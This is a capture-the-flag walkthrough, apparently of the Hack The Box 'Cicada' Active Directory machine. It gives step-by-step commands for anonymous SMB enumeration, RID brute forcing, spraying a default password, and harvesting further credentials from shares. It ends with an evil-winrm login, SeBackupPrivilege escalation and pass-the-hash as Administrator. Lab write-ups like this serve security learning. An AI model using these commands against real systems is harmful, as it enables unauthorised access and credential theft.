# Cicada (AD)

#### ### Listing Shared Resources:

> `smbclient -L //10.10.11.35 -N`

#### Connect to `/DEV` with the username "anonymous" and a Null password:

> `smbclient -U "anonymous" //10.10.11.35/DEV`

#### Enumerating Usernames:

> `nxc smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute`

!\[\[Pasted image 20241210223513.png]]

#### Brute force Login using those usernames and the default password found on the /HR/

> nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb\*@Lp#nZp!8' !\[\[Pasted image 20241210223839.png]]

> _Michael didn't change the password, idiot!_

#### Check the Shares We Have Access to with the New Credentials:

> `smbmap -H 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'`

It appears we have the same access as with the "anonymous" user, making the access pretty useless.

**Enumerating Usernames Again with the New Credentials:**

> `enum4linux -U -H -P -u "michael.wrightson" -p "Cicada\$M6Corpb*@Lp#nZp\!8" 10.10.11.35`

!\[\[Pasted image 20241210230844.png]]

The account `david.orelious` was found, with the password `aRt$Lp#7t*VQ!3`.

#### Check for Shares We Have Access to with David's Credentials:

> `smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'`

!\[\[Pasted image 20241210231230.png]]

#### Let's Connect to All Directories and Look for Useful Information:

> `smbclient //10.10.11.35/IPC$ -U "david.orelious"`

**Found a Script Containing Emily's Credentials:**

`$username = "emily.oscars" $password = "Q!3@Lp#M6b*7t*Vt"`

#### Running the Command with Emily's Credentials:

> `smbmap -H 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`

!\[\[Pasted image 20241210234557.png]]

#### OH We Can Read Admin Content Now

Let's try to get a reverse shell now.

\`evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6&#x62;_&#x37;&#x74;_&#x56;t'

### Privilege Escalation

Now we need to escalate our privileges, the first common way we can check is by using the _whoami/priv_ command to check for any privileges that we can exploit.

![](https://miro.medium.com/v2/resize:fit:884/1*Zv3byaqy9kKzL-yb-nDhew.png)

A quick search on Google on the privileges will lead us to this site showing us how to exploit “SeBackupPrivilege”:

[**Windows Privilege Escalation: SeBackupPrivilege — Hacking Articles**](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

We got the NTLM hash for the Administrator, we can use evil-winrm to log in with the hash using the following command:

evil-winrm -i 10.10.11.35 -u 'Administrator' -H ''

Navigate to the Desktop and access root .txt
